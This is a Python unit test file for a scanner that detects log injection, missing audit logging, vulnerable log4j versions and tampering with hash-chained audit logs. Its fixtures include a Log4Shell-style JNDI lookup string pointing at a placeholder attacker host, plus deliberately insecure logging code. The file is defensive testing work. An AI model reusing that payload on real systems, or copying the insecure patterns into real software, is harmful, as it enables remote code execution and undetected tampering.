import copy
from pathlib import Path
import tempfile
import unittest

from audit_logging_integrity_auditor import (
    audit_logging_inline,
    audit_logging_project,
    compute_entry_hash,
    verify_hash_chained_log,
)


def _controls(report):
    return {(item["control_id"], item["severity"]) for item in report["findings"]}


def _build_chain(count=3):
    entries = []
    previous = ""
    for index in range(count):
        entry = {
            "actor": f"user-{index}",
            "action": "role.update",
            "timestamp": f"2026-10-18T10:0{index}:00Z",
            "outcome": "success",
            "prev_hash": previous,
        }
        entry["hash"] = compute_entry_hash(entry)
        previous = entry["hash"]
        entries.append(entry)
    return entries


class AuditLoggingInlineTests(unittest.TestCase):
    def test_log_injection_from_request_input_is_detected(self):
        source = (
            "from flask import request\n"
            "import logging\n"
            "logger = logging.getLogger(__name__)\n"
            "def search():\n"
            "    logger.info(f\"Search for {request.args.get('q')}\")\n"
        )
        report = audit_logging_inline(source, filename="search.py")
        self.assertEqual(report["format"], "sniper-audit-logging-inline-v1")
        hits = [f for f in report["findings"] if f["control_id"] == "SNIPER-LOGG-03"]
        self.assertEqual(len(hits), 1)
        self.assertEqual(hits[0]["severity"], "medium")
        self.assertEqual(hits[0]["cwe"], "CWE-117")
        self.assertEqual(hits[0]["line"], 5)
        self.assertIn("\\x1b", hits[0]["description"])

    def test_sanitized_log_call_is_not_flagged(self):
        source = (
            "from flask import request\n"
            "def search():\n"
            "    logger.info(\"Search for %r\", request.args.get(\"q\"))\n"
        )
        report = audit_logging_inline(source, filename="search.py")
        self.assertFalse(any(f["control_id"] == "SNIPER-LOGG-03" for f in report["findings"]))

    def test_express_console_log_concatenation_is_detected(self):
        source = "app.get('/s', (req, res) => {\n  console.log('q=' + req.query.q);\n  res.send('ok');\n});\n"
        report = audit_logging_inline(source, filename="server.js")
        self.assertIn(("SNIPER-LOGG-03", "medium"), _controls(report))

    def test_vulnerable_log4j_gradle_is_critical(self):
        report = audit_logging_inline(
            "dependencies {\n    implementation 'org.apache.logging.log4j:log4j-core:2.14.1'\n}\n",
            filename="build.gradle",
        )
        hits = [f for f in report["findings"] if f["control_id"] == "SNIPER-LOGG-04"]
        self.assertEqual(len(hits), 1)
        self.assertEqual(hits[0]["severity"], "critical")
        self.assertEqual(hits[0]["cwe"], "CWE-917")
        self.assertEqual(hits[0]["line"], 2)

    def test_vulnerable_log4j_maven_is_critical(self):
        pom = (
            "<dependency>\n"
            "  <groupId>org.apache.logging.log4j</groupId>\n"
            "  <artifactId>log4j-core</artifactId>\n"
            "  <version>2.14.1</version>\n"
            "</dependency>\n"
        )
        report = audit_logging_inline(pom, filename="pom.xml")
        self.assertIn(("SNIPER-LOGG-04", "critical"), _controls(report))

    def test_patched_log4j_is_clean(self):
        report = audit_logging_inline(
            "implementation 'org.apache.logging.log4j:log4j-core:2.17.1'\n",
            filename="build.gradle",
        )
        self.assertEqual(report["finding_count"], 0)

    def test_jndi_literal_is_high(self):
        source = 'public class T {\n  String p = "${jndi:ldap://attacker.example/a}";\n}\n'
        report = audit_logging_inline(source, filename="T.java")
        self.assertIn(("SNIPER-LOGG-04", "high"), _controls(report))

    def test_unlogged_flask_delete_endpoint_is_flagged(self):
        source = (
            "from flask import Flask\n"
            "app = Flask(__name__)\n"
            "\n"
            "@app.route(\"/admin/users/<int:user_id>\", methods=[\"DELETE\"])\n"
            "def delete_user(user_id):\n"
            "    db.delete_user(user_id)\n"
            "    return \"\", 204\n"
        )
        report = audit_logging_inline(source, filename="admin.py")
        hits = [f for f in report["findings"] if f["control_id"] == "SNIPER-LOGG-01"]
        self.assertEqual(len(hits), 1)
        self.assertEqual(hits[0]["severity"], "medium")
        self.assertEqual(hits[0]["cwe"], "CWE-778")
        self.assertEqual(hits[0]["line"], 4)
        self.assertEqual(report["mutation_endpoint_count"], 1)
        self.assertEqual(report["unlogged_mutation_count"], 1)

    def test_unlogged_express_refund_endpoint_is_flagged(self):
        source = (
            "router.post('/payments/refund', async (req, res) => {\n"
            "  await refund(req.body.id);\n"
            "  res.json({ ok: true });\n"
            "});\n"
        )
        report = audit_logging_inline(source, filename="routes.js")
        self.assertIn(("SNIPER-LOGG-01", "medium"), _controls(report))
        self.assertEqual(report["unlogged_mutation_count"], 1)

    def test_unlogged_spring_delete_mapping_is_flagged(self):
        source = (
            "@DeleteMapping(\"/admin/users/{id}\")\n"
            "public ResponseEntity<Void> deleteUser(@PathVariable Long id) {\n"
            "    userService.delete(id);\n"
            "    return ResponseEntity.noContent().build();\n"
            "}\n"
        )
        report = audit_logging_inline(source, filename="AdminController.java")
        self.assertIn(("SNIPER-LOGG-01", "medium"), _controls(report))

    def test_clean_flask_admin_delete_with_audit_log_has_no_findings(self):
        source = (
            "import logging\n"
            "from flask import Flask\n"
            "audit_logger = logging.getLogger(\"audit\")\n"
            "app = Flask(__name__)\n"
            "\n"
            "@app.route(\"/admin/delete/<int:item_id>\", methods=[\"POST\"])\n"
            "def admin_delete(item_id):\n"
            "    remove_item(item_id)\n"
            "    audit_logger.info(\"admin_delete\", extra={\"actor\": current_user.id, \"outcome\": \"success\", \"target\": item_id})\n"
            "    return \"\", 204\n"
        )
        report = audit_logging_inline(source, filename="admin.py")
        self.assertEqual(report["finding_count"], 0, report["findings"])
        self.assertEqual(report["mutation_endpoint_count"], 1)
        self.assertEqual(report["unlogged_mutation_count"], 0)

    def test_audit_call_missing_actor_and_outcome_is_low(self):
        source = "def handler(item_id):\n    audit_log(action=\"delete_item\", target=item_id)\n"
        report = audit_logging_inline(source, filename="svc.py")
        hits = [f for f in report["findings"] if f["control_id"] == "SNIPER-LOGG-05"]
        self.assertEqual(len(hits), 1)
        self.assertEqual(hits[0]["severity"], "low")
        self.assertIn("actor", hits[0]["description"])
        self.assertIn("outcome", hits[0]["description"])

    def test_complete_audit_call_is_clean(self):
        source = "def handler(uid):\n    record_event(\"export\", actor=uid, outcome=\"ok\")\n"
        report = audit_logging_inline(source, filename="svc.py")
        self.assertFalse(any(f["control_id"] == "SNIPER-LOGG-05" for f in report["findings"]))

    def test_log_overwrite_and_delete_are_flagged(self):
        source = (
            "import os\n"
            "def rotate():\n"
            "    with open(\"audit.log\", \"w\") as fh:\n"
            "        fh.write(\"\")\n"
            "    os.remove(AUDIT_LOG_PATH)\n"
        )
        report = audit_logging_inline(source, filename="maint.py")
        hits = [f for f in report["findings"] if f["control_id"] == "SNIPER-LOGG-06"]
        self.assertEqual({f["line"] for f in hits}, {3, 5})
        self.assertTrue(all(f["severity"] == "medium" for f in hits))
        self.assertIn("Denetim günlüğü üzerine yazılıyor veya siliniyor", str(hits[0]))

    def test_append_mode_log_is_clean(self):
        source = "def write(line):\n    with open(\"audit.log\", \"a\") as fh:\n        fh.write(line)\n"
        report = audit_logging_inline(source, filename="maint.py")
        self.assertFalse(any(f["control_id"] == "SNIPER-LOGG-06" for f in report["findings"]))

    def test_login_without_logging_is_low(self):
        source = (
            "def login(username, password):\n"
            "    user = find_user(username)\n"
            "    return user and user.check(password)\n"
        )
        report = audit_logging_inline(source, filename="auth.py")
        self.assertIn(("SNIPER-LOGG-01", "low"), _controls(report))

    def test_login_with_logging_is_clean(self):
        source = (
            "def login(username, password):\n"
            "    user = find_user(username)\n"
            "    ok = bool(user and user.check(password))\n"
            "    security_logger.info(\"login\", extra={\"actor\": username, \"outcome\": ok})\n"
            "    return ok\n"
        )
        report = audit_logging_inline(source, filename="auth.py")
        self.assertEqual(report["finding_count"], 0, report["findings"])

    def test_inline_rejects_empty_and_oversized_content(self):
        with self.assertRaises(ValueError):
            audit_logging_inline("   ")
        with self.assertRaises(ValueError):
            audit_logging_inline(None)  # type: ignore[arg-type]
        with self.assertRaises(ValueError):
            audit_logging_inline("x" * 512_001)


class HashChainVerificationTests(unittest.TestCase):
    def test_valid_chain_of_three_entries(self):
        result = verify_hash_chained_log(_build_chain(3))
        self.assertEqual(result["format"], "sniper-hash-chained-log-verification-v1")
        self.assertEqual(result["entry_count"], 3)
        self.assertTrue(result["valid"])
        self.assertIsNone(result["first_broken_index"])
        self.assertEqual(result["issues"], [])

    def test_tampered_middle_entry_breaks_at_index_one(self):
        entries = _build_chain(3)
        entries[1]["outcome"] = "failure"
        result = verify_hash_chained_log(entries)
        self.assertFalse(result["valid"])
        self.assertEqual(result["first_broken_index"], 1)
        self.assertIn({"index": 1, "kind": "hash_mismatch"}, [
            {"index": issue["index"], "kind": issue["kind"]} for issue in result["issues"]
        ])

    def test_removed_entry_is_chain_break(self):
        entries = _build_chain(3)
        del entries[1]
        result = verify_hash_chained_log(entries)
        self.assertFalse(result["valid"])
        self.assertEqual(result["first_broken_index"], 1)
        self.assertEqual(result["issues"][0]["kind"], "chain_break")

    def test_genesis_must_be_empty_or_zeroes(self):
        entries = _build_chain(1)
        zero_entry = copy.deepcopy(entries[0])
        zero_entry["prev_hash"] = "0" * 64
        zero_entry["hash"] = compute_entry_hash(zero_entry)
        self.assertTrue(verify_hash_chained_log([zero_entry])["valid"])
        bad = copy.deepcopy(entries[0])
        bad["prev_hash"] = "abc"
        bad["hash"] = compute_entry_hash(bad)
        result = verify_hash_chained_log([bad])
        self.assertEqual(result["issues"][0]["kind"], "chain_break")

    def test_missing_field_bad_timestamp_and_time_regression(self):
        entries = []
        previous = ""
        timestamps = ["2026-10-18T10:05:00Z", "2026-10-18T10:00:00+00:00", "not-a-date"]
        for index, stamp in enumerate(timestamps):
            entry = {"actor": "admin", "action": "x", "timestamp": stamp, "prev_hash": previous}
            if index != 0:
                entry["outcome"] = "success"
            entry["hash"] = compute_entry_hash(entry)
            previous = entry["hash"]
            entries.append(entry)
        result = verify_hash_chained_log(entries)
        kinds = {(issue["index"], issue["kind"]) for issue in result["issues"]}
        self.assertIn((0, "missing_field"), kinds)
        self.assertIn((1, "time_regression"), kinds)
        self.assertIn((2, "bad_timestamp"), kinds)
        self.assertEqual(result["first_broken_index"], 0)

    def test_invalid_input_raises_value_error(self):
        with self.assertRaises(ValueError):
            verify_hash_chained_log({"not": "a list"})  # type: ignore[arg-type]
        with self.assertRaises(ValueError):
            verify_hash_chained_log(["string-entry"])  # type: ignore[list-item]

    def test_empty_chain_is_valid(self):
        result = verify_hash_chained_log([])
        self.assertTrue(result["valid"])
        self.assertEqual(result["entry_count"], 0)


class AuditLoggingProjectTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.base = Path(self.temp.name)
        self.project = self.base / "logging-app"
        self.project.mkdir()
        self.allowed = (self.base.resolve(),)

    def tearDown(self):
        self.temp.cleanup()

    def test_project_scan_aggregates_findings_and_counts(self):
        (self.project / "admin.py").write_text(
            "@app.route(\"/admin/users/<int:user_id>\", methods=[\"DELETE\"])\n"
            "def delete_user(user_id):\n"
            "    db.delete_user(user_id)\n"
            "    return \"\", 204\n",
            encoding="utf-8",
        )
        (self.project / "build.gradle").write_text(
            "implementation 'org.apache.logging.log4j:log4j-core:2.14.1'\n",
            encoding="utf-8",
        )
        (self.project / "README.md").write_text("${jndi:ignored}\n", encoding="utf-8")
        report = audit_logging_project(str(self.project), allowed_roots=self.allowed)
        self.assertEqual(report["format"], "sniper-audit-logging-audit-v1")
        self.assertEqual(report["scanned_files"], 2)
        self.assertEqual(report["mutation_endpoint_count"], 1)
        self.assertEqual(report["unlogged_mutation_count"], 1)
        controls = {item["control_id"] for item in report["findings"]}
        self.assertIn("SNIPER-LOGG-01", controls)
        self.assertIn("SNIPER-LOGG-04", controls)
        self.assertEqual(
            report["controls_evaluated"],
            ["SNIPER-LOGG-01", "SNIPER-LOGG-03", "SNIPER-LOGG-04", "SNIPER-LOGG-05", "SNIPER-LOGG-06"],
        )

    def test_project_outside_allowed_roots_is_rejected(self):
        with self.assertRaises(ValueError):
            audit_logging_project(str(self.project), allowed_roots=(self.project.resolve(),))


if __name__ == "__main__":
    unittest.main()
